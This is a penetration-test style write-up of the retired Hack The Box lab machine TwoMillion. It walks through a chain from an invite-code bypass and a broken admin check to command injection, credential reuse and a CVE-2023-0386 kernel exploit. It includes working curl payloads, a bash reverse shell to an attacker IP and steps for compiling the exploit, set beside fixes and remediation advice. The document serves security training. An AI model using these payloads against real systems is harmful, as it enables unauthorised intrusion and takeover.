@@ -1,0 +1,706 @@
+# Penetration Test Report — Hack The Box: TwoMillion
+
+![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00?style=flat&logo=hackthebox&logoColor=black)
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
+![OS](https://img.shields.io/badge/OS-Linux-informational)
+![Status](https://img.shields.io/badge/Status-Rooted-success)
+![License](https://img.shields.io/badge/License-MIT-blue)
+
+> **Author:** `<YOUR NAME>` — `<your.email@example.com>` — [LinkedIn](#) · [HTB Profile](#)
+> **Report date:** 2026-11-22
+> **Classification:** Public — Educational
+
+---
+
+## ⚠️ Disclaimer
+
+This assessment was performed against **TwoMillion**, a deliberately vulnerable, **retired** machine
+hosted on the [Hack The Box](https://www.hackthebox.com/) training platform, inside an isolated lab
+network accessed through an authorised VPN.
+
+- The target is owned by Hack The Box and explicitly provided for security testing.
+- No real-world system, production service or third party was involved.
+- Flag values are **redacted** in accordance with the Hack The Box content policy.
+- All techniques described here are documented for **defensive and educational purposes only**.
+
+---
+
+## 📑 Table of Contents
+
+1. [Executive Summary](#1-executive-summary)
+2. [Scope & Rules of Engagement](#2-scope--rules-of-engagement)
+3. [Attack Path Overview](#3-attack-path-overview)
+4. [Findings Summary](#4-findings-summary)
+5. [Detailed Findings](#5-detailed-findings)
+6. [Technical Walkthrough](#6-technical-walkthrough)
+7. [Remediation Roadmap](#7-remediation-roadmap)
+8. [Skills & Framework Mapping](#8-skills--framework-mapping)
+9. [Tooling](#9-tooling)
+10. [References](#10-references)
+11. [Appendix — Vulnerable Source Code](#11-appendix--vulnerable-source-code)
+
+---
+
+## 1. Executive Summary
+
+### 1.1 Overview
+
+A black-box penetration test was conducted against the host `2million.htb`, a web application
+replicating a legacy version of the Hack The Box platform. The objective was to identify
+ exploitable weaknesses and achieve full system compromise.
+
+**Result: full compromise (root) achieved**, starting from an unauthenticated position on the
+network, through a chain of five distinct weaknesses.
+
+### 1.2 Business Impact (non-technical)
+
+| Risk | Business consequence |
+|---|---|
+| **Anyone can register and self-promote to administrator** | Complete bypass of the platform's trust model; any anonymous user gains administrative control. |
+| **Administrators can execute OS commands** | Full takeover of the web server, access to source code and customer data. |
+| **Database password stored in a public web directory** | Credential theft; because the same password is reused for a system account, it also grants interactive server access. |
+| **Operating system not patched since 2022** | Any local user can become `root`, nullifying every other access control on the host. |
+
+Individually these issues range from *Medium* to *High*. **Chained together they result in a total
+loss of confidentiality, integrity and availability of the host and its data.**
+
+### 1.3 Key Takeaway
+
+The most severe issue was **not** a missing security control, but a control that was
+**implemented incorrectly**: an authorisation function returned a JSON *string* instead of a
+boolean, making the check always evaluate as "authorised". A second finding showed the same
+pattern — input sanitisation existed, but the *unsanitised* variable was used afterwards.
+
+> **Security controls must be tested for correctness, not just for presence.**
+
+---
+
+## 2. Scope & Rules of Engagement
+
+| Item | Value |
+|---|---|
+| **Target** | `2million.htb` (`<TARGET_IP>`) |
+| **Environment** | Hack The Box retired machine, isolated lab |
+| **Approach** | Black box, no credentials provided |
+| **Attacker host** | Kali Linux (`<TUN0_IP>`) |
+| **In scope** | All TCP services on the target host |
+| **Out of scope** | HTB infrastructure, other players, DoS testing |
+| **Objective** | Retrieve `user.txt` and `root.txt` |
+| **Duration** | Single session |
+
+### 2.1 Objectives Achieved
+
+- [x] Unauthenticated access to the application (invite-code bypass)
+- [x] Privilege escalation to application administrator
+- [x] Remote code execution on the web server
+- [x] Lateral movement to a privileged local user — 🚩 `user.txt`: `<REDACTED>`
+- [x] Full privilege escalation to `root` — 🚩 `root.txt`: `<REDACTED>`
+
+---
+
+## 3. Attack Path Overview
+
+```mermaid
+flowchart TD
+    A["Anonymous attacker<br/>TCP 22 / 80"] --> B["Obfuscated JS reveals<br/>hidden API endpoint"]
+    B --> C["ROT13 → Base64<br/>Invite code generated"]
+    C --> D["Registered user<br/>PHPSESSID"]
+    D --> E["API self-enumeration<br/>/api/v1"]
+    E --> F["Broken Access Control<br/>PUT /admin/settings/update"]
+    F --> G["Application Administrator"]
+    G --> H["Command Injection<br/>POST /admin/vpn/generate"]
+    H --> I["RCE as www-data"]
+    I --> J[".env in web root<br/>DB credentials"]
+    J --> K["Password reuse<br/>SSH as admin"]
+    K --> L["🚩 user.txt"]
+    K --> M["Kernel 5.15.70 unpatched<br/>CVE-2023-0386 OverlayFS/FUSE"]
+    M --> N["root"]
+    N --> O["🚩 root.txt"]
+
+    style F fill:#ff6b6b,color:#fff
+    style H fill:#ff6b6b,color:#fff
+    style M fill:#ff6b6b,color:#fff
+    style L fill:#9fef00,color:#000
+    style O fill:#9fef00,color:#000
+```
+
+**Chain in one line:**
+`Client-side logic disclosure → Access control bypass → Command injection → Credential exposure → Kernel LPE`
+
+---
+
+## 4. Findings Summary
+
+| ID | Finding | Severity | CVSS 3.1 | Component |
+|---|---|:---:|:---:|---|
+| **HTB-2M-01** | Hidden API endpoint disclosed via obfuscated client-side JavaScript; invite-code generation bypass | 🟠 Medium | 6.5 | `/js/inviteapi.min.js`, `/api/v1/invite/*` |
+| **HTB-2M-02** | Broken Access Control — any authenticated user can grant themselves administrator privileges | 🔴 High | 8.8 | `AdminController::update_settings()` |
+| **HTB-2M-03** | OS Command Injection in administrator VPN generation endpoint | 🔴 High | 7.2 *(8.8 chained)* | `VPNController::admin_vpn()` |
+| **HTB-2M-04** | Database credentials exposed in web root (`.env`) + password reuse on a local account | 🔴 High | 7.8 | `/var/www/html/.env` |
+| **HTB-2M-05** | Outdated Linux kernel vulnerable to CVE-2023-0386 (OverlayFS / FUSE local privilege escalation) | 🔴 High | 7.8 | Kernel `5.15.70-051570-generic` |
+| **HTB-2M-06** | Verbose, self-documenting API exposes full administrative attack surface | 🔵 Info | — | `/api/v1` |
+
+**Totals:** 0 Critical · 4 High · 1 Medium · 1 Informational
+
+---
+
+## 5. Detailed Findings
+
+### HTB-2M-01 — Hidden API Endpoint Disclosed via Client-Side Obfuscation
+
+| | |
+|---|---|
+| **Severity** | Medium |
+| **CVSS 3.1** | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` — **6.5** |
+| **CWE** | CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-656 (Reliance on Security Through Obscurity) |
+| **OWASP** | A04:2021 – Insecure Design |
+
+**Description**
+The invite-only registration process relies on a JavaScript file (`inviteapi.min.js`) obfuscated
+with a `packer`-style `eval()` routine. Deobfuscation reveals an undocumented function,
+`makeInviteCode()`, calling `POST /api/v1/invite/how/to/generate`. The endpoint discloses,
+through a ROT13-encoded message, the existence of a second unauthenticated endpoint
+(`POST /api/v1/invite/generate`) that returns a **valid invite code**, Base64-encoded.
+
+**Impact**
+The invite-only registration control is fully bypassed by an unauthenticated attacker, who can
+create unlimited accounts. This provides the authenticated foothold required for HTB-2M-02.
+
+**Proof of Concept**
+```bash
+# 1. Reveal the hidden endpoint
+curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
+
+# 2. Decode the ROT13 hint
+echo '<ROT13_DATA>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+# → "In order to generate the invite code, make a POST request to /api/v1/invite/generate"
+
+# 3. Generate and decode a valid invite code
+curl -s -X POST http://2million.htb/api/v1/invite/generate | jq -r '.data.code' | base64 -d
+# → XXXXX-XXXXX-XXXXX-XXXXX
+```
+
+**Remediation**
+- Never rely on client-side obfuscation to protect server functionality.
+- Remove invite-generation endpoints from the public API; move them to an authenticated
+  administrative interface.
+- Enforce rate limiting and server-side issuance of invite codes.
+
+---
+
+### HTB-2M-02 — Broken Access Control: Self-Service Administrator Promotion
+
+| | |
+|---|---|
+| **Severity** | High |
+| **CVSS 3.1** | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — **8.8** |
+| **CWE** | CWE-863 (Incorrect Authorization), CWE-704 (Incorrect Type Conversion) |
+| **OWASP** | A01:2021 – Broken Access Control |
+
+**Description**
+`PUT /api/v1/admin/settings/update` is intended to be administrator-only. Its authorisation gate
+is:
+
+```php
+$is_admin = $this->is_admin($router);
+if (!$is_admin) {
+    return header("HTTP/1.1 401 Unauthorized");
+}
+```
+
+However, `is_admin()` **does not return a boolean** — it returns a JSON *string* produced by
+`json_encode(['message' => FALSE])`. In PHP, any non-empty string is *truthy*, therefore
+`!$is_admin` is **always false** and the gate never triggers, even for non-administrative users.
+
+The endpoint then accepts an `is_admin` parameter and writes it directly to the database,
+allowing any authenticated user to promote **their own account**.
+
+**Impact**
+Complete vertical privilege escalation inside the application. Combined with HTB-2M-03 this
+leads directly to remote code execution.
+
+**Proof of Concept**
+```bash
+export SESS='PHPSESSID=<SESSION_COOKIE>'
+
+# Confirm the account is NOT an administrator
+curl -s http://2million.htb/api/v1/admin/auth --cookie "$SESS" | jq
+# → {"message": false}
+
+# The endpoint returns a validation error instead of 401 → authorisation already bypassed
+curl -i -X PUT http://2million.htb/api/v1/admin/settings/update \
+  --cookie "$SESS"
+# → HTTP/1.1 200 OK  {"status":"danger","message":"Invalid content type."}
+
+# Self-promotion (note: is_admin must be the INTEGER 1, due to the strict !== comparison)
+curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
+  --cookie "$SESS" \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"test@2million.htb","is_admin":1}' | jq
+# → {"id":13,"username":"test","is_admin":1}
+
+# Verify
+curl -s http://2million.htb/api/v1/admin/auth --cookie "$SESS" | jq
+# → {"message": true}
+```
+
+**Remediation**
+- Return **native booleans** from authorisation helpers; never reuse a serialised HTTP response
+  as an internal return value.
+- Separate the *presentation* layer (`json_encode`) from the *authorisation* layer.
+- Enforce a strict, explicit check: `if ($is_admin !== true) { http_response_code(401); exit; }`.
+- Never allow a user-controlled request body to modify their own privilege level — derive it
+  server-side from an access-control list.
+- Add automated tests asserting that a low-privileged session receives `401` on every
+  administrative route.
+
+---
+
+### HTB-2M-03 — OS Command Injection in Administrator VPN Generation
+
+| | |
+|---|---|
+| **Severity** | High |
+| **CVSS 3.1** | `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` — **7.2** standalone · **8.8** when chained with HTB-2M-02 |
+| **CWE** | CWE-78 (OS Command Injection) |
+| **OWASP** | A03:2021 – Injection |
+
+**Description**
+`POST /api/v1/admin/vpn/generate` accepts a `username` parameter. The handler correctly calls a
+sanitising routine (`regenerate_user_vpn()`), but subsequently builds a shell command using the
+**original, unsanitised** variable:
+
+```php
+$this->regenerate_user_vpn($router, $username);                       // sanitised copy used here
+$output = shell_exec("/usr/bin/cat /var/www/html/VPN/user/$username.ovpn");  // raw input used here
+```
+
+Shell metacharacters (`;`, `|`, `` ` ``, `$()`) in `username` therefore result in arbitrary
+command execution as `www-data`.
+
+**Impact**
+Remote code execution on the web server, leading to source-code disclosure, credential theft
+and a foothold for further compromise.
+
+**Proof of Concept**
+```bash
+# Baseline behaviour
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  --cookie "$SESS" -H 'Content-Type: application/json' \
+  -d '{"username":"test"}'
+# → returns the .ovpn configuration file
+
+# Injection PoC
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  --cookie "$SESS" -H 'Content-Type: application/json' \
+  -d '{"username":"test;id;"}'
+# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+**Reverse shell** (Base64-encoded to avoid JSON/shell quoting issues):
+```bash
+# Attacker
+nc -lvnp 1234
+echo -n 'bash -i >& /dev/tcp/<TUN0_IP>/1234 0>&1' | base64 -w0
+
+# Deliver
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  --cookie "$SESS" -H 'Content-Type: application/json' \
+  -d '{"username":"test;echo <BASE64_PAYLOAD> | base64 -d | bash;"}'
+```
+
+**Remediation**
+- Eliminate `shell_exec()` for file reads — use PHP's native `file_get_contents()`.
+- If a shell is unavoidable, apply `escapeshellarg()` to **every** interpolated value, and use
+  the sanitised variable consistently.
+- Validate `username` against a strict allow-list (`^[a-zA-Z0-9_-]{1,32}$`) **before** any use.
+- Run the web application under a restricted account with a minimal filesystem footprint.
+
+---
+
+### HTB-2M-04 — Credentials Exposed in Web Root & Password Reuse
+
+| | |
+|---|---|
+| **Severity** | High |
+| **CVSS 3.1** | `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — **7.8** |
+| **CWE** | CWE-522 (Insufficiently Protected Credentials), CWE-256 (Plaintext Storage of a Password), CWE-521 (Weak Password Reuse) |
+| **OWASP** | A05:2021 – Security Misconfiguration |
+
+**Description**
+The file `/var/www/html/.env` — located inside the document root — contains plaintext database
+credentials. The database user `admin` also exists as a **local system account** (`uid=1000`,
+valid login shell) and **reuses the same password**, allowing interactive SSH access.
+
+**Evidence**
+```bash
+www-data@2million:/var/www/html$ ls -la
+... .env ...
+
+www-data@2million:/var/www/html$ cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123        # lab credential
+
+$ grep -E 'bash$' /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+admin:x:1000:1000::/home/admin:/bin/bash
+
+$ ssh admin@2million.htb            # password reuse → interactive session
+```
+
+**Impact**
+Escalation from a low-privileged service account to an interactive human account; access to the
+user flag and to the local attack surface required for HTB-2M-05. Potential direct database
+compromise.
+
+**Remediation**
+- Store secrets **outside** the document root; inject them via environment variables or a
+  secrets manager (Vault, AWS Secrets Manager).
+- Add `.env` to `.gitignore` and block access to dotfiles at the web-server level:
+  ```nginx
+  location ~ /\. { deny all; return 404; }
+  ```
+- Enforce unique credentials per service; prohibit reuse between application and OS accounts.
+- Disable password-based SSH authentication in favour of key-based authentication.
+- Rotate all credentials that were stored in plaintext.
+
+---
+
+### HTB-2M-05 — Outdated Kernel: CVE-2023-0386 (OverlayFS / FUSE LPE)
+
+| | |
+|---|---|
+| **Severity** | High |
+| **CVSS 3.1** | `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — **7.8** |
+| **CVE** | [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386) |
+| **CWE** | CWE-269 (Improper Privilege Management) |
+| **OWASP** | A06:2021 – Vulnerable and Outdated Components |
+
+**Description**
+The host runs kernel `5.15.70-051570-generic`, a **mainline build dated 2022-09-23**, on
+Ubuntu 22.04.2 LTS (jammy). The Ubuntu fix for CVE-2023-0386 shipped in `5.15.0-70.77`
+(USN-5975-1). Despite the similar version numbers, the installed kernel **predates the patch**
+and is vulnerable.
+
+The flaw lies in the OverlayFS **copy-up** operation: when a file is copied from a FUSE-backed
+lower layer mounted inside an unprivileged user namespace, the kernel fails to correctly
+validate UID/GID mapping. An unprivileged user can therefore make a **setuid-root binary**
+materialise with root ownership in the upper layer and execute it.
+
+**Evidence**
+```bash
+admin@2million:~$ uname -a
+Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 GNU/Linux
+
+admin@2million:~$ lsb_release -a
+Distributor ID: Ubuntu
+Description:    Ubuntu 22.04.2 LTS
+Codename:       jammy
+
+admin@2million:~$ cat /var/mail/admin
+Subject: Urgent: Patch System OS
+... That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+```
+
+> An internal email explicitly flagged the pending patch — the vulnerability was **known to the
+> organisation and left unremediated**, which is a patch-management process failure, not only a
+> technical one.
+
+**Exploitation**
+```bash
+# Attacker
+git clone https://github.com/xkaneiki/CVE-2023-0386
+zip -r cve.zip CVE-2023-0386 && scp cve.zip admin@2million.htb:/tmp
+
+# Target
+cd /tmp && unzip cve.zip && cd CVE-2023-0386
+make all
+./fuse ./ovlcap/lower ./gc &
+./exp
+
+id
+# → uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Impact**
+Total compromise of the host. Every file, credential and service on the system is exposed;
+all other security controls are rendered ineffective.
+
+**Remediation**
+- Patch the kernel to `5.15.0-70.77` or later (`apt update && apt full-upgrade`) and reboot.
+- Enable **automatic security updates** (`unattended-upgrades`) for the kernel and core packages.
+- Where immediate patching is impossible, mitigate by disabling unprivileged user namespaces:
+  ```bash
+  sysctl -w kernel.unprivileged_userns_clone=0
+  ```
+- Introduce a formal patch-management SLA (e.g. critical/high kernel CVEs remediated within 7 days).
+
+---
+
+### HTB-2M-06 — Verbose, Self-Documenting API (Informational)
+
+| | |
+|---|---|
+| **Severity** | Informational |
+| **Component** | `GET /api/v1` |
+
+**Description**
+An authenticated request to `/api/v1` returns a complete catalogue of available endpoints,
+including HTTP methods and descriptions for administrative functionality. Combined with
+explicit validation errors (`Missing parameter: email`, `Missing parameter: is_admin`), the API
+effectively **documents its own attack surface** for an attacker.
+
+**Remediation**
+- Restrict API schema/discovery endpoints to authenticated administrators or internal networks.
+- Return generic error messages to clients; log detailed validation failures server-side only.
+- Note: verbose errors are useful in development — ensure debug behaviour is disabled in production.
+
+---
+
+## 6. Technical Walkthrough
+
+### 6.1 Reconnaissance
+
+```bash
+echo '<TARGET_IP> 2million.htb' | sudo tee -a /etc/hosts
+nmap -sC -sV -Pn -oN scans/nmap_initial.txt <TARGET_IP>
+```
+
+| Port | Service | Notes |
+|---|---|---|
+| 22/tcp | OpenSSH | Password authentication enabled |
+| 80/tcp | nginx | Redirects to `http://2million.htb` |
+
+The web application is a replica of the legacy Hack The Box platform. `Join → Join HTB` leads
+to `/invite`.
+
+### 6.2 Invite Code Bypass → Authenticated Session
+
+1. View page source → `<script defer src="/js/inviteapi.min.js">`.
+2. Deobfuscate the packer (`de4js`, or replace `eval` with `console.log` in the browser console).
+3. Discovered functions: `verifyInviteCode()` and **`makeInviteCode()`**.
+4. `POST /api/v1/invite/how/to/generate` → ROT13 hint → `POST /api/v1/invite/generate` → Base64
+   invite code.
+5. Submit the code on `/invite`, register on `/register`, log in on `/login`.
+
+> **Methodology note:** every client-side asset is attacker-controlled input. Obfuscation is
+> not a security boundary.
+
+### 6.3 API Enumeration
+
+```bash
+export SESS='PHPSESSID=<SESSION_COOKIE>'
+
+curl -i http://2million.htb/api                      # 401 without a session
+curl -s http://2million.htb/api/v1 --cookie "$SESS" | jq   # full endpoint catalogue
+```
+
+Interesting routes: `GET /admin/auth`, `POST /admin/vpn/generate`, `PUT /admin/settings/update`.
+
+### 6.4 Privilege Escalation to Administrator
+
+See **HTB-2M-02**. The decisive observation was that the endpoint returned
+`Invalid content type.` **instead of `401`** — proof that the authorisation gate had already
+been passed. Each subsequent error message was used to build a valid request incrementally.
+
+### 6.5 Command Injection → Foothold
+
+See **HTB-2M-03**. Shell stabilisation:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# CTRL+Z
+stty raw -echo; fg
+reset
+```
+
+### 6.6 Lateral Movement
+
+See **HTB-2M-04**. `.env` → `admin:SuperDuperPass123` → SSH → 🚩 `user.txt`.
+
+### 6.7 Privilege Escalation to root
+
+See **HTB-2M-05**. Kernel enumeration → CVE-2023-0386 → 🚩 `root.txt`.
+
+### 6.8 Post-Exploitation (bonus)
+
+`/root/thank_you.json` contains a layered-encoded message from the HTB team. Decoding chain:
+
+```
+URL decode → HEX decode → Base64 decode → XOR (key: "HackTheBox", UTF-8)
+```
+
+Decoded with [CyberChef](https://gchq.github.io/CyberChef/). A neat exercise in recognising
+encoding layers by their characteristic alphabets and structural markers.
+
+---
+
+## 7. Remediation Roadmap
+
+| Priority | Action | Findings | Effort |
+|:---:|---|---|:---:|
+| **P0** | Patch the kernel and reboot; enable `unattended-upgrades` | 2M-05 | Low |
+| **P0** | Fix `is_admin()` to return a boolean; enforce strict authorisation on all admin routes | 2M-02 | Low |
+| **P0** | Remove `shell_exec()` from the VPN handler; allow-list `username` | 2M-03 | Low |
+| **P1** | Move `.env` out of the web root; rotate DB credentials; deny dotfiles in nginx | 2M-04 | Medium |
+| **P1** | Eliminate password reuse; enforce SSH key authentication | 2M-04 | Medium |
+| **P2** | Remove public invite-generation endpoints; rate-limit registration | 2M-01 | Medium |
+| **P2** | Restrict API discovery output and genericise client-facing errors | 2M-06 | Low |
+| **P3** | Add regression tests for authorisation on every privileged endpoint | All | Medium |
+| **P3** | Introduce SAST/dependency scanning and a patch-management SLA in CI/CD | All | High |
+
+---
+
+## 8. Skills & Framework Mapping
+
+### 8.1 Demonstrated Skills
+
+- Network and service enumeration (`nmap`)
+- JavaScript deobfuscation and client-side logic analysis
+- REST API enumeration and abuse; iterative error-driven request crafting
+- Source-code review of PHP for authorisation and injection flaws
+- Exploitation of type-juggling / incorrect-authorization logic
+- OS command injection and reverse-shell handling; TTY stabilisation
+- Linux post-exploitation enumeration and credential harvesting
+- Lateral movement via password reuse
+- Kernel vulnerability research, exploit compilation and execution
+- Multi-layer data decoding (ROT13, Base64, URL, HEX, XOR)
+- Professional vulnerability reporting with CVSS scoring and remediation guidance
+
+### 8.2 OWASP Top 10 (2021) Coverage
+
+| Category | Finding |
+|---|---|
+| A01 – Broken Access Control | 2M-02 |
+| A03 – Injection | 2M-03 |
+| A04 – Insecure Design | 2M-01 |
+| A05 – Security Misconfiguration | 2M-04, 2M-06 |
+| A06 – Vulnerable and Outdated Components | 2M-05 |
+| A07 – Identification and Authentication Failures | 2M-04 |
+
+### 8.3 MITRE ATT&CK Mapping
+
+| Technique | ID | Where |
+|---|---|---|
+| Exploit Public-Facing Application | T1190 | 2M-02 / 2M-03 |
+| Command and Scripting Interpreter: Unix Shell | T1059.004 | 2M-03 |
+| Unsecured Credentials: Credentials In Files | T1552.001 | 2M-04 |
+| Valid Accounts | T1078 | 2M-04 |
+| Exploitation for Privilege Escalation | T1068 | 2M-05 |
+| Data Obfuscated / Deobfuscated | T1027 / T1140 | 2M-01, post-exploitation |
+
+---
+
+## 9. Tooling
+
+| Tool | Purpose |
+|---|---|
+| `nmap` | Port scanning and service enumeration |
+| `curl` + `jq` | Manual API interaction and JSON parsing |
+| Burp Suite | Request interception and inspection |
+| de4js / browser DevTools | JavaScript deobfuscation |
+| CyberChef | Multi-layer decoding |
+| `netcat` | Reverse-shell listener |
+| `gcc` / `make` | On-target exploit compilation |
+| `scp` / `ssh` | Payload transfer and lateral movement |
+| Public PoC (`xkaneiki/CVE-2023-0386`) | Kernel privilege escalation |
+
+---
+
+## 10. References
+
+- [CVE-2023-0386 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-0386)
+- [Ubuntu USN-5975-1 — Linux kernel vulnerabilities](https://ubuntu.com/security/notices/USN-5975-1)
+- [Public PoC — xkaneiki/CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386)
+- [OWASP Top 10 (2021)](https://owasp.org/Top10/)
+- [OWASP API Security Top 10](https://owasp.org/API-Security/)
+- [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
+- [Hack The Box — TwoMillion (official write-up, retired machine)](https://www.hackthebox.com/)
+
+---
+
+## 11. Appendix — Vulnerable Source Code
+
+### A.1 `AdminController.php` — broken authorisation gate
+
+```php
+public function update_settings($router){
+    $db = Database::getDatabase();
+    $is_admin = $this->is_admin($router);   // returns a JSON STRING, not a boolean
+    if(!$is_admin){                         // non-empty string => always truthy
+        return header("HTTP/1.1 401 Unauthorized");
+        exit;
+    }
+    ...
+    if($is_admin !== 1 && $is_admin !== 0){ // strict comparison: requires a JSON integer
+        return json_encode([
+            'status'  => 'danger',
+            'message' => 'Variable is_admin needs to be either 0 or 1.'
+        ]);
+    }
+    $stmt = $db->query('UPDATE users SET is_admin=? WHERE email=?', ['s'=>[$is_admin,$email]]);
+}
+```
+
+```php
+public function is_admin($router){
+    ...
+    if($user['is_admin'] == 1){
+        header('Content-Type: application/json');
+        return json_encode(['message' => TRUE]);   // ← string, not bool
+    } else {
+        header('Content-Type: application/json');
+        return json_encode(['message' => FALSE]);  // ← still a non-empty string
+    }
+}
+```
+
+### A.2 `VPNController.php` — sanitisation applied, then bypassed
+
+```php
+$username = $json->username;
+$this->regenerate_user_vpn($router, $username);   // sanitised internally
+$output = shell_exec("/usr/bin/cat /var/www/html/VPN/user/$username.ovpn"); // raw $username
+return is_array($output) ? implode("<br>", $output) : $output;
+```
+
+**Suggested fix**
+
+```php
+$username = $json->username;
+if (!preg_match('/^[a-zA-Z0-9_-]{1,32}$/', $username)) {
+    http_response_code(400);
+    exit;
+}
+$path = "/var/www/html/VPN/user/{$username}.ovpn";
+return file_get_contents($path);   // no shell involved
+```
+
+---
+
+## 📌 Lessons Learned
+
+1. **A `401` that never arrives is a finding.** The absence of an expected error is as
+   informative as its presence.
+2. **Weak typing turns security checks into no-ops.** In PHP, a non-empty string containing
+   `"false"` is *true*. Authorisation helpers must return native booleans.
+3. **Sanitisation must be applied to the value that is actually used.** A secure function
+   followed by an insecure one provides no protection.
+4. **Client-side code is public.** Obfuscation delays analysis; it does not prevent it.
+5. **Secrets in the web root are secrets disclosed.** And password reuse converts a data leak
+   into a system compromise.
+6. **Patch management is a security control.** The organisation *knew* about the kernel CVE —
+   an unactioned warning is a process failure with the same outcome as ignorance.
+
+---
+
+<div align="center">
+
+**Full compromise achieved — `user.txt` ✅ · `root.txt` ✅**
+
+*Report produced for educational purposes against an authorised Hack The Box laboratory target.*
+
+</div>
